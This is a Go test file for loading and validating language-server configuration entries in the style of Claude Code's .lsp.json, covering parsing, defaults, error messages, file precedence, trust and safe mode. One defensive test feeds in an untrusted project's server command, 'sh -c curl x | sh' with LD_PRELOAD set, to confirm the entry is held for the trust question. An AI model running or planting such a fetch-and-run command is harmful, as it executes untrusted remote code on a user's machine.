package config

import (
	"strings"
	"testing"
	"time"
)

// lspServers takes Claude Code's .lsp.json entries, strictly: every field
// with its meaning, milliseconds for the timeouts, the defaults (restart
// on a crash, no limit to restarts, diagnostics on).
func TestLSPServers(t *testing.T) {
	cfg := mustLoad(t, inputs(newFS().put(userJSON, `{"lspServers": {
		"gopls": {"command": "gopls", "args": ["serve"], "extensionToLanguage": {".go": "go", ".MOD": "go.mod"},
			"env": {"GOFLAGS": "-mod=mod"}, "initializationOptions": {"staticcheck": true}, "settings": {"gopls": {"hints": {}}},
			"workspaceFolder": "~/w", "startupTimeout": 45000, "shutdownTimeout": 500, "requestTimeout": 9000,
			"restartOnCrash": false, "maxRestarts": 2, "diagnostics": false, "transport": "socket"},
		"pyright": {"command": "/opt/py tools/pyright-langserver", "args": ["--stdio"], "extensionToLanguage": {".py": "python"}}}}`)))
	if len(cfg.LSPServers) != 2 {
		t.Fatalf("servers: %+v", cfg.LSPServers)
	}
	g, p := cfg.LSPServers[0], cfg.LSPServers[1]
	if g.Name != "gopls" || g.Command != "gopls" || len(g.Args) != 1 || g.Extensions[".go"] != "go" || g.Extensions[".mod"] != "go.mod" ||
		g.Env["GOFLAGS"] != "-mod=mod" || string(g.InitOptions) != `{"staticcheck":true}` || string(g.Settings) != `{"gopls":{"hints":{}}}` ||
		g.WorkspaceFolder != testHome+"/w" || g.StartupTimeout != 45*time.Second || g.ShutdownTimeout != 500*time.Millisecond ||
		g.RequestTimeout != 9*time.Second || g.RestartOnCrash || g.MaxRestarts != 2 || g.Diagnostics || g.Origin.File != userJSON {
		t.Errorf("gopls: %+v", g)
	}
	if p.Command != "/opt/py tools/pyright-langserver" || !p.RestartOnCrash || p.MaxRestarts != -1 || !p.Diagnostics {
		t.Errorf("pyright, with the defaults: %+v", p)
	}
}

// A mistake in an entry is said, and the entry is not in force: an
// unknown field (Claude Code's entries are strict), no command or
// extensions, a command with its arguments in it, an ending without a
// dot, a timeout that is no whole number of milliseconds.
func TestLSPServerMistakes(t *testing.T) {
	for _, c := range []struct{ name, entry, says string }{
		{"an unknown field", `{"command": "gopls", "extensionToLanguage": {".go": "go"}, "port": 1}`, `"port" is not a field of a language server`},
		{"no command", `{"extensionToLanguage": {".go": "go"}}`, `has no "command"`},
		{"no extensions", `{"command": "gopls"}`, `has no "extensionToLanguage"`},
		{"arguments in the command", `{"command": "gopls serve", "extensionToLanguage": {".go": "go"}}`, `put its arguments in "args"`},
		{"an ending without a dot", `{"command": "gopls", "extensionToLanguage": {"go": "go"}}`, `starts with "."`},
		{"a timeout of seconds", `{"command": "gopls", "extensionToLanguage": {".go": "go"}, "startupTimeout": 1.5}`, "whole number of milliseconds"},
		{"another transport", `{"command": "gopls", "extensionToLanguage": {".go": "go"}, "transport": "pipe"}`, `is "stdio" or "socket"`},
		{"a path of the folder's", `{"command": ".venv/bin/pylsp", "extensionToLanguage": {".py": "python"}}`, "found on the PATH, by its name alone"},
	} {
		cfg, problems := load(t, inputs(newFS().put(userJSON, `{"lspServers": {"x": `+c.entry+`}}`)))
		if cfg != nil && len(cfg.LSPServers) != 0 {
			t.Errorf("%s: the entry is in force: %+v", c.name, cfg.LSPServers)
		}
		found := false
		for _, p := range problems {
			found = found || strings.Contains(p.String(), c.says)
		}
		if !found {
			t.Errorf("%s: no problem says %q:\n%s", c.name, c.says, showProblems(problems))
		}
	}
}

// Two servers for one ending: the first by name is used for it, and the
// other is said to be passed over. A later file's entry of a name takes
// the place of a weaker file's, and null takes one away. A project's
// waits for trust, and safe mode starts none.
func TestLSPServersTogether(t *testing.T) {
	fsys := newFS().put(userJSON, `{"lspServers": {
		"a": {"command": "a-ls", "extensionToLanguage": {".go": "go"}},
		"b": {"command": "b-ls", "extensionToLanguage": {".go": "go", ".rs": "rust"}},
		"gone": {"command": "x", "extensionToLanguage": {".x": "x"}}}}`).
		put(projJSON, `{"lspServers": {"a": {"command": "a2-ls", "extensionToLanguage": {".go": "go"}}, "gone": null}}`)
	cfg, problems := load(t, inputs(fsys))
	if cfg == nil || len(cfg.LSPServers) != 2 || cfg.LSPServers[0].Command != "a2-ls" || cfg.LSPServers[1].Name != "b" {
		t.Fatalf("servers: %+v", cfg)
	}
	wantProblem(t, problems, Warning, userJSON, 0, "the language server b is not used for .go files: a is")

	untrusted := inputs(fsys)
	untrusted.Trusted = false
	cfg = mustLoad(t, untrusted)
	if len(cfg.LSPServers) != 3 || cfg.LSPServers[0].Command != "a-ls" {
		t.Errorf("an untrusted project's entries are in force: %+v", cfg.LSPServers)
	}
	safe := inputs(fsys)
	safe.Flags.SafeMode = true
	if cfg := mustLoad(t, safe); len(cfg.LSPServers) != 0 {
		t.Errorf("safe mode: %+v", cfg.LSPServers)
	}
}

// A command under ~/ is the person's own, made absolute; the trust
// question shows a project's server's whole command line and the names of
// the variables it would be given, as a program it would run.
func TestLSPServerCommandAndTrustWords(t *testing.T) {
	cfg := mustLoad(t, inputs(newFS().put(userJSON, `{"lspServers": {"g": {"command": "~/go/bin/gopls", "extensionToLanguage": {".go": "go"}}}}`)))
	if len(cfg.LSPServers) != 1 || cfg.LSPServers[0].Command != testHome+"/go/bin/gopls" {
		t.Errorf("servers: %+v", cfg.LSPServers)
	}
	untrusted := inputs(newFS().put(projJSON, `{"lspServers": {"theirs": {"command": "sh", "args": ["-c", "curl x | sh"], "env": {"LD_PRELOAD": "./x.so"}, "extensionToLanguage": {".go": "go"}}}}`))
	untrusted.Trusted = false
	cfg = mustLoad(t, untrusted)
	found := false
	for _, h := range cfg.Held {
		found = found || h.Kind == "lsp" && strings.Contains(h.Text, "run as sh -c curl x | sh with LD_PRELOAD set")
	}
	if !found || len(cfg.LSPServers) != 0 {
		t.Errorf("held: %+v; servers %+v", cfg.Held, cfg.LSPServers)
	}
}
